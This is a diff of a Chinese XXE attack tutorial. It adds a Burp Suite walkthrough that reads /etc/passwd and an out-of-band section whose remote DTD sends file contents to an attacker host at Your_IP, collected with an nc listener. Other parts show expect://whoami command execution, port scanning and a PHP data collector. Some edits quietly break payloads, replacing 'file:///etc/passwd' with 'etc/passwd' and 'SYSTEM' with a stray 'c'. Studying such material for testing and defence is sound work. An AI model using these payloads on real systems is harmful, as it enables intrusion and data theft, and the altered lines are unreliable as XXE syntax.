@@ -64,7 +64,7 @@ XML实例：
 
 参考链接：[**XML 验证**](https://www.runoob.com/xml/xml-dtd.html)
 
-```xml
+```dtd
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE note SYSTEM "stu.dtd">
 <stu id="1">
@@ -80,7 +80,7 @@ XML实例：
 
 ### 示例二
 
-```xml
+```dtd
 <?xml version="1.0"?>
 <!DOCTYPE note [
 <!ELEMENT note (to,from,heading,body)>
@@ -168,7 +168,7 @@ XML实体又分为**内部实体**和**外部实体**，声明方式如下：
     <!-- DOCTYPE test：指定根元素 --> 
     <!DOCTYPE test [ 
     <!ENTITY xxe SYSTEM 
-    "file:///etc/passwd">
+    "etc/passwd">
     ]>
     <xxx>&xxe;</xxx>
     ```
@@ -195,7 +195,7 @@ http://www.webtester.com/xxe.php?xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21
 
 ### file://
 
-```
+```dtd
 <?xml version="1.0"?><!DOCTYPE  a  [<!ENTITY b SYSTEM "file:///etc/passwd">]><c>&b;</c>
 ```
 
@@ -205,7 +205,7 @@ http://www.webtester.com/xxe.php?xml=%3c%3fxml%20version%3d%221.0%22%3f%3e%3c!do
 
 我也不知道为什么没有成功。。。查看源码：
 
-```
+```php
 <?php
 include 'init.php';
 
@@ -218,11 +218,45 @@ print_r($data);
 ?>
 ```
 
-水平有限，看不出所以然来，看来要学一学**世界上最好的语言了**（手动狗头）。
+水平有限，看不出所以然来，看来要学一学**世界上最好的语言了**（手动狗头）。看下面的示例：
+
+当我们点击`Hack The XML`的时候，用burp抓包，看到post提交了数据：
+
+```
+data=%3C%3Fxml+version%3D%221.0%22+%3F%3E%3C%21DOCTYPE+thp+%5B+%3C%21ELEMENT+thp+ANY%3E%3C%21ENTITY+book+%22Universe%22%3E%5D%3E%3Cthp%3EHack+The+%26book%3B%3C%2Fthp%3E
+```
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210831103002.png)
+
+有没有感觉很熟悉，对，就是URL编码后的XML格式数据，可以使用burp的Decoder模块解码看看。
+
+```dtd
+<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY book system "file:///etc/passwd">]><thp>Hack The &book;</thp>
+```
+
+可以看到`DOCTYPE`定义根元素为`thp`，在`ELEMENT`中指定数据类型为任意类型，`ENTITY`定义了属性名称为`book`，接下来我们就开始搞事，修改book的值为`SYSTEM "file:///etc/passwd"`：
+
+```
+<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY><!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack The &book;</thp>
+```
+
+编码后的结果
+
+```
+%3C%3Fxml+version%3D%221.0%22+%3F%3E%3C%21DOCTYPE+thp+%5B+%3C%21ELEMENT+thp+ANY%3E%3C%21ENTITY+book+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cthp%3EHack+The+%26book%3B%3C%2Fthp%3E
+```
+
+通过burp重放
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210831112622.png)
+
+将Repeater修改后的data复制到Proxy中，点击forward，查看页面，可以看到这里也获取到了结果。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210831112644.png)
 
 ### php://
 
-```
+```dtd
 <?xml version="1.0" encoding="utf-8"?> 
 <!DOCTYPE xdsec [<!ELEMENT methodname ANY >
 <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php" >]>
@@ -237,7 +271,7 @@ print_r($data);
 
 扫描端口
 
-```
+```dtd
 <?xml version="1.0"?>
 <!DOCTYPE ANY [
 <!ENTITY test SYSTEM "http://10.0.0.4:80">
@@ -259,7 +293,7 @@ print_r($data);
 
 执行命令
 
-```
+```dtd
 <?xml version="1.0"?> <!doctype any [ <!entity test system "expect://whoami">
 ```
 
@@ -277,10 +311,10 @@ print_r($data);
 
 构造payload，发送到后端
 
-```
+```dtd
 ?xml=<?xml version="1.0"?>
 <!DOCTYPE ANY[
-<!ENTITY % file SYSTEM "file:///var/www/html/1.txt">
+<!ENTITY % file c "file:///var/www/html/1.txt">
 <!ENTITY % remote SYSTEM "http://10.0.0.4/evil.xml">
 %remote;
 %all;
@@ -290,13 +324,79 @@ print_r($data);
 
 或者这样
 
-```
+```dtd
 <!ENTITY % all "<!ENTITY send SYSTEM 'http://10.0.0.4/1.txt?file=%file;'>">
 ```
 
 读取内容
 
-```
+```php
 <?php file_put_contents("1.txt", $_GET['file']); ?>
 ```
+
+
+
+## 高级 XXE——XXE-OOB
+
+在之前的攻击中，我们能够在`<thp>`标签中获得返回的响应。那么如果我们看不到响应或遇到字符或文件限制怎
+么办？我们怎样使用带外数据协议（OOB）来发送我们的数据？我们可以提供远程文档类型定义（DTD）文件来执行OOB-XXE，而不是在请求payload中定义我们的攻击。DTD是结构良好的XML文件，用于定义XML文档的结
+构和法律元素及属性。为了简单起见，我们的DTD将包含我们所有的攻击或exfil payload，这将帮助我们解决许
+多字符的限制。在我们的实验示例中，我们将有XXE漏洞的服务器请求一个托管在远程服务器上的DTD。
+
+新的XXE攻击将分四个阶段进行：
+
+1. 使用篡改后的XXE XML攻击
+2. 对于存在漏洞的XML解析器，它会从攻击者服务器抓取DTD文件
+3. 该DTD文件包含读取/etc/passwd文件的代码
+4. 该DTD文件也包含用于隐秘传输/etc/passwd内容的代码（可能是经过编码的）
+
+### 设置我们的攻击者机器和 XXE-OOB payload：
+
+指定一个外部的DTD文件，而不是原始文件
+
+```
+<!ENTITY % dtd SYSTEM "http://Your_IP/payload.dtd"> %dtd;
+```
+
+新的“数据”POST payload将如下所示（记得更改Your_IP）：
+
+```
+<?xml version="1.0"?><!DOCTYPE thp [<!ELEMENT thp ANY ><!ENTITY % dtd SYSTEM
+"http://[Your_IP]/payload.dtd"> %dtd;]><thp><error>%26send%3B</error></thp>
+```
+
+创建名为`payload.dtd`的文件在攻击者服务器上托管此payload
+
+```
+gedit /var/www/html/payload.dtd
+```
+
+```
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://Your_IP:8888/collect=%file;'>">
+%all;
+```
+
+刚刚创建的DTD文件指示靶机读取/etc/ passwd文件，然后尝试向攻击机发出Web请求，将敏感数据发送。为了确保我们收到响应，我们需要启动 Web 服务器来托管DTD文件并设置NetCat 监听器
+
+```
+nc -l -p 8888
+```
+
+有可能遇到“检测到实体引用循环”类型的错误，具体的报错内容大概是：
+
+```
+“Detected an entity reference loop in <b>/var/www/html/xxe.php on line <b>20"。
+```
+
+在进行XXE攻击时，通常会遇到解析器错误。很多时候，XXE解析器仅仅允许某些字符，因此读取带有特殊字符的文件会报错。我们可以做些什么来解决这个问题？在使用PHP的情况下，我们可以使用[PHP输入和输出流](http://php.net/manual/en/wrappers.php.php)来读取本地文件，并使用`php://filter/read=convert.base64-encode`对它们进行base64编码。重启我们的NetCat监听器并更改payload.dtd文件以使用此功能：
+
+```
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-
+encode/resource=file:///etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://[Your_IP]:8888/collect=%file;'>">
+%all;
+```
+
+一旦我们重放我们新修改的请求，我们现在就可以看到我们的目标服务器首先获取并运行了payload.dtd文件，然后监听8888端口的NetCat处理程序发出二次Web请求。当然，需要考虑对请求进行编码或解码的问题。
 
